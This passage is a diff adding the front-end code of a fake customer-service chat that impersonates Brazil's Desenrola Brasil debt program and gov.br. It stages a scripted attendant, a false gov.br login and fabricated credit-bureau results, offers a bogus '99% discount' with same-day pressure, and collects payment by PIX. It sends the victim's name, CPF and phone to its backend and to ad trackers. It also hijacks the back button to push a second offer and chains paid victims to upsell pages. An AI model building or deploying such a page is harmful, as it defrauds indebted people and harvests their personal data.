+      });
+      wrap.appendChild(row);
+      msgs.appendChild(wrap); scroll();
+    });
+  }
+
+  async function botSay(html) {
+    addTyping(); await sleep(1100); removeTyping();
+    botRow('<div class="bubble-bot">' + tag(html) + '</div>');
+    await sleep(800);
+  }
+
+  async function startFlow() {
+    if (!NOME || !CPF) {
+      addSystem('<em>(Dados de identificação ausentes. Redirecionando para a consulta...)</em>');
+      setTimeout(function () { window.location.href = '../consulta/'; }, 1800);
+      return;
+    }
+
+    addImage('images/image1.png');
+    await botSay('Olá <strong>{NOME_COMPLETO}</strong>, seja bem-vindo(a) ao canal oficial de atendimento do <strong>Programa Desenrola Brasil</strong>. Seus dados estão protegidos sob sigilo fiscal e criptografia de ponta a ponta. 🔒');
+    await botSay('Aguarde um instante, nossa atendente especializada já está assumindo o seu atendimento.');
+    addVideoAutoplay('../assets/video15.mp4');
+    addSystem('<em>(Atendente Letícia M. conectou-se ao atendimento seguro)</em> 💬');
+
+    await sleep(15000);
+
+    // Confirmação de dados
+    var confirmWrap = document.createElement('div');
+    confirmWrap.style.marginLeft = '40px';
+    confirmWrap.style.marginBottom = '10px';
+    var cCard = document.createElement('div');
+    cCard.className = 'confirm-card';
+    cCard.innerHTML = '<span class="confirm-title">Para sua segurança, confirme os dados cadastrais:</span>'
+      + '<strong>Nome do Titular:</strong><span>' + NOME_COMPLETO + '</span>'
+      + '<strong>CPF:</strong><span>' + CPF_FORMATADO + '</span>'
+      + (NASC ? '<strong>Data de Nascimento:</strong><span>' + formatData(NASC) + '</span>' : '');
+    var btnsConfirm = document.createElement('div');
+    btnsConfirm.className = 'confirm-btns';
+    ['Sim, está correto.', 'Não sou eu'].forEach(function (label) {
+      var btn = document.createElement('button');
+      btn.className = 'chat-btn' + (label.indexOf('Sim') === 0 ? ' solid' : '');
+      btn.textContent = label;
+      btn.onclick = function () {
+        confirmWrap.remove();
+        addUser(label);
+        if (label.indexOf('Sim') === 0) continueFlow();
+        else { 
+          setTimeout(async function () { 
+            await botSay('Por favor, informe o CPF correto para prosseguir com a renegociação.'); 
+            setTimeout(function(){ window.location.href = '../consulta/'; }, 1500); 
+          }, 600); 
+        }
+      };
+      btnsConfirm.appendChild(btn);
+    });
+    confirmWrap.appendChild(cCard); confirmWrap.appendChild(btnsConfirm);
+    msgs.appendChild(confirmWrap); scroll();
+  }
+
+  async function continueFlow() {
+    await sleep(500);
+    await botSay('Obrigada pela confirmação!');
+    await botSay('Conectando à sua conta gov.br...');
+    await botSay('<strong>Autenticação efetuada com sucesso!</strong>');
+    await botSay('<strong>{NOME_COMPLETO}</strong><br>Você possui condições especiais de renegociação com as instituições conveniadas:');
+    addImage('images/image2.png');
+
+    await addButtons(['CONTINUAR'], false, true, true);
+    await addAudioWithButton('../assets/desktop2026.mp3', 'SIM! QUERO NEGOCIAR');
+
+    await botSay('<em>Consultando o Sistema de Informações de Crédito (SCR) do Banco Central e bases conveniadas...</em>');
+    await sleep(2600);
+    await botSay('<em>Localizando registros ativos em seu CPF...</em>');
+    await sleep(2600);
+    await botSay('<strong>Consulta concluída!</strong>');
+    await sleep(2000);
+    await botSay('Identificamos <strong>4 dívidas ativas</strong> em aberto. Os valores acumulados totalizam entre <strong>R$ 1.728,74 e R$ 5.278,23</strong> vinculados ao seu CPF.');
+    await sleep(2600);
+
+    infoCard([
+      { text: 'Situação do Documento:', style: 'label' },
+      { text: 'CPF: {CPF_FORMATADO}',   style: 'value' },
+      { text: 'STATUS: RESTRITO / NEGATIVADO.', style: 'bold' }
+    ]);
+
+    await botSay('Seu índice de SCORE atual encontra-se classificado como <strong>Baixo / Risco de Crédito:</strong>');
+    addImage('../assets/score.jpg');
+    await botSay('Deseja consultar a proposta de acordo com subsídio oficial e desconto especial disponível para você?');
+    await addButtons(['BUSCAR ACORDO'], false, true, true);
+
+    await botSay('<em>Aplicando diretrizes do Programa Desenrola Brasil...</em>');
+    await botSay('<strong>Proposta de Quitação Localizada!</strong>');
+    infoCard([
+      { text: '1 (uma) proposta de quitação integral gerada para:', style: 'bold' },
+      { text: '{NOME_COMPLETO}',                                  style: 'value' },
+      { text: 'Documento: {CPF_FORMATADO}',                        style: 'value' }
+    ]);
+    await addButtons(['VER ACORDO'], false, true, true);
+    
+    await addAudioThen('../assets/buscaacordo.mp3', async function() {
+      await botSay('Parabéns <strong>{NOME_COMPLETO}!</strong><br><br>Sua proposta foi aprovada com <strong>99% DE DESCONTO</strong> pelo Programa Oficial!');
+      return Promise.resolve();
+    });
+
+    await botSay('<em>Acessando o Termo de Acordo <strong>{CODIGO_ACORDO}</strong>...</em>');
+    await botSay('Termo de Homologação <strong><em>{CODIGO_ACORDO}</em></strong> emitido para <strong>{NOME_COMPLETO}</strong> (CPF: {CPF_FORMATADO})');
+    await botSay('O termo é intransferível e exclusivo para o titular portador do CPF <strong>{CPF_FORMATADO}</strong>.');
+    await botSay('Deseja confirmar o acordo com <strong>99% DE DESCONTO</strong> para liquidar todas as dívidas e restabelecer seu crédito por apenas <strong>{VALOR}</strong>?');
+    await addButtons(['CONFIRMAR O ACORDO E LIMPAR O NOME'], false, true, true);
+
+    await addAudioThen('../assets/parabens.mp3', async function() {
+      await botSay('<strong>Acordo confirmado com sucesso!</strong>');
+      return await addButtons(['CONTINUAR'], false, true, true);
+    });
+
+    await addAudioThen('../assets/pagamento.mp3', async function() {
+      infoCard([
+        { text: 'Protocolo de Homologação: {CODIGO_ACORDO}',  style: 'label' },
+        { text: 'Beneficiário(a):',                           style: 'label' },
+        { text: '{NOME_COMPLETO}',                            style: 'bold'  },
+        { text: 'Documento (CPF):',                           style: 'label' },
+        { text: '{CPF_FORMATADO}',                            style: 'bold'  },
+        { text: 'Quitação e Baixa de Todas as Dívidas Ativas no CPF.', style: 'value' },
+        { text: 'Restabelecimento do Score (+895 Pontos).',   style: 'bold'  },
+        { text: 'Valor Final Homologado: {VALOR}',            style: 'label' }
+      ]);
+      return await addButtons(['CONTINUAR PARA O PAGAMENTO'], false, true, true);
+    });
+
+    await addAudioThen('../assets/aviso.mp3', async function() {
+      await botSay('<strong><em>Atenção!</em></strong> <em>Condição homologada válida apenas para liquidação no dia de hoje.</em>');
+      return await botSay('<em>Clique no botão abaixo para gerar sua Guia Oficial de Pagamento com Chave PIX.</em>');
+    });
+
+    // Botão final: Gera PIX via API de pagamento gov
+    await sleep(600);
+    var finRow = document.createElement('div');
+    finRow.style.marginLeft = '40px';
+    finRow.style.marginBottom = '12px';
+    finRow.style.width = 'calc(100% - 40px)';
+    
+    var finBtn = document.createElement('button');
+    finBtn.className = 'btn-link-final';
+    finBtn.innerHTML = 'GERAR GUIA DE PAGAMENTO PIX 🔒';
+    finBtn.onclick = async function() {
+      finBtn.disabled = true;
+      finBtn.innerHTML = 'GERANDO GUIA OFICIAL...';
+      
+      try {
+        const body = new URLSearchParams();
+        body.set('nome', NOME_COMPLETO);
+        body.set('cpf', CPF);
+        body.set('telefone', PHONE);
+        body.set('etapa', ETAPA);
+        (function(){
+          var p = new URLSearchParams(window.location.search);
+          ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','src','sck','gclid','fbclid','ttclid','leadId'].forEach(function(k){
+            var v = p.get(k);
+            if (v) body.set(k, v);
+          });
+        })();
+
+        const apiResp = await fetch('/api/pagamento.php', { method: 'POST', body: body });
+        const result = await apiResp.json();
+        if (!result.success) { throw new Error(result.error || 'Erro ao gerar PIX'); }
+        const pixCode = result.pixCode || (result.data && result.data.pix && (result.data.pix.qrcode || result.data.pix.code)) || '';
+        
+        if (pixCode) {
+          finRow.remove();
+
+          // Pedido pendente na Utmify: dispara assim que o PIX existe.
+          try {
+            if (typeof window.utmifyEnviarPendente === 'function') {
+              window.utmifyEnviarPendente({
+                orderId: result.token || (result.data && result.data.id) || '',
+                priceInCents: Math.round((result.valor || 0) * 100),
+                productName: result.product_title_used || 'Validação Efetiva - Frete',
+                customer: {
+                  name: result.customer_name_used || NOME_COMPLETO,
+                  email: result.customer_email_used || '',
+                  phone: PHONE,
+                  document: CPF
+                }
+              });
+            } else {
+              console.warn('[Utmify] utmify-order.js nao carregou; pendente nao enviado.');
+            }
+          } catch (eUtm) {
+            console.error('[Utmify] Erro ao disparar pendente:', eUtm);
+          }
+
+          // Meta: InitiateCheckout no momento em que o PIX existe.
+          try {
+            if (typeof window.metaInitiateCheckout === 'function') {
+              window.metaInitiateCheckout({
+                orderId: result.token || (result.data && result.data.id) || '',
+                priceInCents: Math.round((result.valor || 0) * 100),
+                productName: result.product_title_used || ''
+              });
+            }
+          } catch (eMeta) {
+            console.error('[Meta] Erro ao disparar InitiateCheckout:', eMeta);
+          }
+          
+          await botSay('Aqui está a sua <strong>Guia Oficial de Pagamento PIX</strong>:');
+          
+          const pixContainer = document.createElement('div');
+          pixContainer.className = 'pix-container';
+          pixContainer.innerHTML = `
+            <div class="pix-header-badge">✓ Guia Homologada gov.br</div>
+            <div class="pix-title">Pagamento via PIX Instantâneo</div>
+            <div class="pix-sub">Valor do Acordo: <strong>${VALOR}</strong></div>
+            <div class="qrcode-wrapper" id="qrcode"></div>
+            <div class="pix-copy-paste" id="pixCode" title="Clique para copiar">${pixCode}</div>
+            <button class="chat-btn solid wide" id="copyBtn">COPIAR CÓDIGO PIX</button>
+            <div class="pix-status"><div class="spinner"></div> Aguardando confirmação do Banco Central...</div>
+          `;
+          msgs.appendChild(pixContainer);
+          scroll();
+
+          // Backredirect: gerou o PIX e tentou voltar sem pagar -> oferta com 50%.
+          // Empilha um estado no histórico; o "voltar" cai no popstate e a gente
+          // troca a página pela oferta, levando a query string inteira.
+          try {
+            history.pushState({ pixGerado: true }, '', window.location.href);
+            window.addEventListener('popstate', function () {
+              if (window.__pixPago) return;
+              var bp = new URLSearchParams(window.location.search);
+              bp.set('cpf', CPF);
+              bp.set('nome', NOME_COMPLETO);
+              window.location.replace('/desen/back/?' + bp.toString());
+            });
+          } catch (eBack) {}
+          
+          try {
+            new QRCode(document.getElementById("qrcode"), {
+              text: pixCode,
+              width: 190,
+              height: 190,
+              colorDark: "#000000",
+              colorLight: "#ffffff",
+              correctLevel: QRCode.CorrectLevel.M
+            });
+          } catch(errQr) {
+            document.getElementById("qrcode").innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=' + encodeURIComponent(pixCode) + '" style="border-radius:8px;">';
+          }
+
+          document.getElementById('copyBtn').onclick = function() {
+            navigator.clipboard.writeText(pixCode);
+            var copyBtn = document.getElementById('copyBtn');
+            copyBtn.textContent = '✓ CÓDIGO PIX COPIADO!';
+            copyBtn.style.backgroundColor = '#168821';
+            copyBtn.style.borderColor = '#168821';
+            setTimeout(function() {
+              copyBtn.textContent = 'COPIAR CÓDIGO PIX';
+              copyBtn.style.backgroundColor = '#1351B4';
+              copyBtn.style.borderColor = '#1351B4';
+            }, 2500);
+          };
+
+          // Polling de status de pagamento
+          const transactionId = result.token || (result.data && result.data.id) || '';
+          if (transactionId) {
+            const pollInterval = setInterval(async () => {
+              try {
+                const stResp = await fetch('/api/verificar.php?id=' + encodeURIComponent(transactionId), { cache: 'no-store' });
+                const statusRes = await stResp.json();
+                const status = String(statusRes.status || (statusRes.data && statusRes.data.status) || '').toLowerCase();
+                
+                if (status === 'paid' || status === 'completed' || status === 'approved' || status === 'authorized') {
+                  clearInterval(pollInterval);
+                  window.__pixPago = true; // desarma o backredirect
+                  pixContainer.querySelector('.pix-status').innerHTML = '✅ <strong>Pagamento Confirmado no Sistema!</strong>';
+                  pixContainer.querySelector('.pix-status').style.color = '#168821';
+                  
+                  // Conversão "paid" pelo front. O webhook da Genesys também
+                  // envia; o helper não duplica e a Utmify casa pelo orderId.
+                  // Ter os dois evita perder a venda se o postback falhar.
+                  try {
+                    if (typeof window.utmifyEnviarPago === 'function') {
+                      window.utmifyEnviarPago({
+                        orderId: transactionId,
+                        priceInCents: Math.round((result.valor || 0) * 100),
+                        productName: result.product_title_used,
+                        customer: {
+                          name: result.customer_name_used || NOME_COMPLETO,
+                          email: result.customer_email_used || '',
+                          phone: PHONE,
+                          document: CPF
+                        }
+                      });
+                    } else {
+                      console.warn('[Utmify] utmify-order.js nao carregou; conversao paga nao enviada.');
+                    }
+                  } catch (eUtm) {
+                    console.error('[Utmify] Erro ao disparar conversao paga:', eUtm);
+                  }
+
+                  // Meta: Purchase no browser, eventID = id da transação. O
+                  // servidor manda o mesmo pela API de Conversões e a Meta deduplica.
+                  try {
+                    if (typeof window.metaPurchase === 'function') {
+                      window.metaPurchase({
+                        orderId: transactionId,
+                        priceInCents: Math.round((result.valor || 0) * 100),
+                        productName: result.product_title_used || '',
+                        customer: {
+                          name: result.customer_name_used || NOME_COMPLETO,
+                          email: result.customer_email_used || '',
+                          phone: PHONE,
+                          document: CPF
+                        }
+                      });
+                    }
+                  } catch (eMeta) {
+                    console.error('[Meta] Erro ao disparar Purchase:', eMeta);
+                  }
+
+                  await sleep(1200);
+                  await botSay('<strong>Pagamento confirmado com sucesso!</strong>');
+                  await botSay('Seu processo de baixa de restrições foi iniciado. Aguarde, estamos verificando as pendências restantes no seu CPF...');
+                  
+                  await sleep(2000);
+                  
+                  // Primeira etapa depois do pagamento principal. A ordem completa
+                  // está no mapa de rotas em /desen/js/admin-bypass.js:
+                  // atendimento -> upsells/1 -> upsell1 -> ... -> upsell4 -> regularizacao.
+                  var redirectParams = new URLSearchParams(window.location.search);
+                  redirectParams.set('cpf', CPF);
+                  redirectParams.set('nome', NOME_COMPLETO);
+                  redirectParams.set('paid', 'true');
+                  window.location.href = '/desen/upsells/1/?' + redirectParams.toString();
+                }
+              } catch (e) {
+                console.error('Erro no polling:', e);
+              }
+            }, 4500);
+          }
+        } else {
+          throw new Error('Código PIX não recebido');
+        }
+      } catch (error) {
+        console.error('Erro ao gerar PIX:', error);
+        alert('Erro ao gerar PIX: ' + error.message);
+        finBtn.disabled = false;
+        finBtn.innerHTML = 'GERAR GUIA DE PAGAMENTO PIX 🔒';
+      }
+    };
+    
+    finRow.appendChild(finBtn);
+    msgs.appendChild(finRow); scroll();
+  }
+
+  window.addEventListener('load', function () {
+    try {
+      // Sincroniza o valor exibido com o que será cobrado, e só então começa.
+      var pronto = (typeof window.catalogoEtapa === 'function')
+        ? window.catalogoEtapa(ETAPA).then(function (item) { if (item) VALOR = 'R$ ' + item.valor; })
+        : Promise.resolve();
+
+      // O segundo callback garante que o atendimento começa mesmo se a
+      // consulta ao catálogo falhar: nesse caso vale o valor do HTML.
+      var comecar = function () { setTimeout(startFlow, 350); };
+      pronto.then(comecar, comecar);
+    } catch (e) {
+      console.error('Erro no startFlow:', e);
+      addSystem('❌ Ocorreu um erro ao carregar o atendimento.');
+    }
+  });
+  </script>
+
+    <!-- VLibras Integration -->
+  <div vw class="enabled">
+    <div vw-access-button class="active"></div>
+    <div vw-plugin-wrapper>
+      <div class="vw-plugin-top-wrapper"></div>
+    </div>
+  </div>
+  <script src="https://vlibras.gov.br/app/vlibras-plugin.js"></script>
+  <script>
+    new window.VLibras.Widget('https://vlibras.gov.br/app');
+  </script>
+
+</body>
+</html>
+
+
